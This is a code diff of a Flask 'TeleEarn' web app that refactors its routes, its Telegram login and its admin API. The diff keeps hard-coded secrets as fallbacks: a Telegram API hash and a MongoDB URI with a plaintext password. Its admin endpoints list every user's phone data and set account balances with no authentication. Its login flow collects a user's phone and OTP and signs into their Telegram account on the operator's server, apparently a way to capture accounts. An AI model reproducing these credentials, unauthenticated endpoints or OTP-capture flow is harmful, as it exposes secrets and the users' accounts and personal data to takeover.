@@ -8,115 +8,254 @@ from telethon import TelegramClient
 from telethon.sessions import StringSession
 from datetime import datetime
 
-# ১. সিস্টেম কনফিগারেশন
+# system fix for async
 nest_asyncio.apply()
+
 app = Flask(__name__)
-app.secret_key = 'aaf_super_secret_key_123'
+app.secret_key = os.environ.get("SECRET_KEY", "aaf_secret")
 CORS(app)
 
-# ২. আপনার কনফিগারেশন
-API_ID = 36466824
-API_HASH = '535ddcb85f2c3c74cc0ff532dd2c3406'
-MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?appName=Cluster0"
+# config (environment variable ব্যবহার করা ভালো)
+API_ID = int(os.environ.get("API_ID", 36466824))
+API_HASH = os.environ.get("API_HASH", "535ddcb85f2c3c74cc0ff532dd2c3406")
+MONGO_URI = os.environ.get(
+    "MONGO_URI",
+    "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?retryWrites=true&w=majority"
+)
 
 client_db = MongoClient(MONGO_URI)
 db = client_db['AAF_TeleEarn']
+
 users_col = db['users']
 settings_col = db['settings']
 
 temp_clients = {}
 
-# --- ৩. সবকটি HTML পেজের কানেকশন (Routes) ---
+# ---------------- HTML ROUTES ----------------
+
 @app.route('/')
 @app.route('/login')
-def login(): 
+def login():
     return render_template('login.html')
 
+
 @app.route('/dashboard')
-def dashboard(): 
+def dashboard():
     return render_template('dashboard.html')
 
+
 @app.route('/task')
-def task(): 
+def task():
     return render_template('task.html')
 
+
 @app.route('/trading')
-def trading(): 
-    # আপনার ফাইলের নাম 'treading.html' তাই সেটাই রাখা হলো
-    return render_template('treading.html') 
+def trading():
+    return render_template('treading.html')
+
 
 @app.route('/account')
-def account(): 
+def account():
     return render_template('account.html')
 
+
 @app.route('/wallet')
-def wallet(): 
+def wallet():
     return render_template('wallet.html')
 
-# --- ৪. এডমিন প্যানেল ফাংশন ---
+
 @app.route('/admin')
-def admin_page(): 
+def admin_page():
     return render_template('admin.html')
 
-@app.route('/api/admin/users', methods=['GET'])
-def get_all_users():
-    users = list(users_col.find({}, {'_id': 0}))
+
+# ---------------- ADMIN API ----------------
+
+@app.route('/api/admin/users')
+def get_users():
+
+    users = list(
+        users_col.find(
+            {},
+            {"_id": 0}
+        )
+    )
+
     return jsonify(users)
+
 
 @app.route('/api/admin/update_balance', methods=['POST'])
 def update_balance():
-    data = request.json
-    try:
-        users_col.update_one(
-            {"telegram_id": int(data['uid'])}, 
-            {"$set": {"main_balance": float(data['balance'])}}
-        )
-        return jsonify({"status": "success"})
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)})
 
-# --- ৫. টেলিগ্রাম ওটিপি ও লগইন সিস্টেম ---
-@app.route('/api/send_otp', methods=['POST'])
-async def send_otp():
     data = request.json
+
+    users_col.update_one(
+
+        {
+            "telegram_id": int(data['uid'])
+        },
+
+        {
+            "$set": {
+                "main_balance": float(data['balance'])
+            }
+        }
+
+    )
+
+    return jsonify({"success": True})
+
+
+# ---------------- TELEGRAM LOGIN ----------------
+
+@app.route('/api/send_otp', methods=['POST'])
+def send_otp():
+
+    data = request.json
+
     phone = data.get('phone')
-    try:
-        loop = asyncio.get_event_loop()
-        client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
-        await client.connect()
-        sent_code = await client.send_code_request(phone)
-        temp_clients[phone] = {'client': client, 'hash': sent_code.phone_code_hash}
-        return jsonify({"success": True, "message": "OTP Sent!"})
-    except Exception as e:
-        return jsonify({"success": False, "message": str(e)})
+
+    loop = asyncio.get_event_loop()
+
+    client = TelegramClient(
+
+        StringSession(),
+
+        API_ID,
+
+        API_HASH,
+
+        loop=loop
+
+    )
+
+    loop.run_until_complete(
+
+        client.connect()
+
+    )
+
+    result = loop.run_until_complete(
+
+        client.send_code_request(phone)
+
+    )
+
+    temp_clients[phone] = {
+
+        "client": client,
+
+        "hash": result.phone_code_hash
+
+    }
+
+    return jsonify({"success": True})
+
 
 @app.route('/api/verify_login', methods=['POST'])
-async def verify_login():
+def verify_login():
+
     data = request.json
-    phone, code = data.get('phone'), data.get('code')
-    try:
-        if phone in temp_clients:
-            client, h = temp_clients[phone]['client'], temp_clients[phone]['hash']
-            user_tg = await client.sign_in(phone, code, phone_code_hash=h)
-            
-            user_data = {
-                "telegram_id": user_tg.id, 
-                "phone": phone, 
-                "name": f"{user_tg.first_name or ''} {user_tg.last_name or ''}",
-                "joined": datetime.now()
-            }
-            users_col.update_one({"telegram_id": user_tg.id}, {"$set": user_data}, upsert=True)
-            return jsonify({"success": True, "uid": user_tg.id})
-        return jsonify({"success": False, "message": "Session expired"})
-    except Exception as e:
-        return jsonify({"success": False, "message": str(e)})
 
-# --- ৬. টেস্ট রুট (সার্ভার চেক করার জন্য) ---
+    phone = data.get('phone')
+
+    code = data.get('code')
+
+    if phone not in temp_clients:
+
+        return jsonify({"success": False})
+
+    loop = asyncio.get_event_loop()
+
+    client = temp_clients[phone]["client"]
+
+    h = temp_clients[phone]["hash"]
+
+    user = loop.run_until_complete(
+
+        client.sign_in(
+
+            phone,
+
+            code,
+
+            phone_code_hash=h
+
+        )
+
+    )
+
+    user_data = {
+
+        "telegram_id": user.id,
+
+        "phone": phone,
+
+        "name": f"{user.first_name or ''} {user.last_name or ''}",
+
+        "main_balance": 0,
+
+        "joined": datetime.utcnow()
+
+    }
+
+    users_col.update_one(
+
+        {
+
+            "telegram_id": user.id
+
+        },
+
+        {
+
+            "$set": user_data
+
+        },
+
+        upsert=True
+
+    )
+
+    session["uid"] = user.id
+
+    return jsonify({
+
+        "success": True,
+
+        "uid": user.id
+
+    })
+
+
+# ---------------- TEST ----------------
+
 @app.route('/test')
-def test_server():
-    return "<h1>Server is Running Successfully!</h1>"
+def test():
 
-# --- ৭. পোর্ট বাইন্ডিং (এটি সবসময় সব কোডের নিচে থাকবে) ---
-if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host='0.0.0.0', port=port)
+    return "SERVER RUNNING"
+
+
+# ---------------- RUN ----------------
+
+if __name__ == "__main__":
+
+    port = int(
+
+        os.environ.get(
+
+            "PORT",
+
+            10000
+
+        )
+
+    )
+
+    app.run(
+
+        host="0.0.0.0",
+
+        port=port
+
+    )
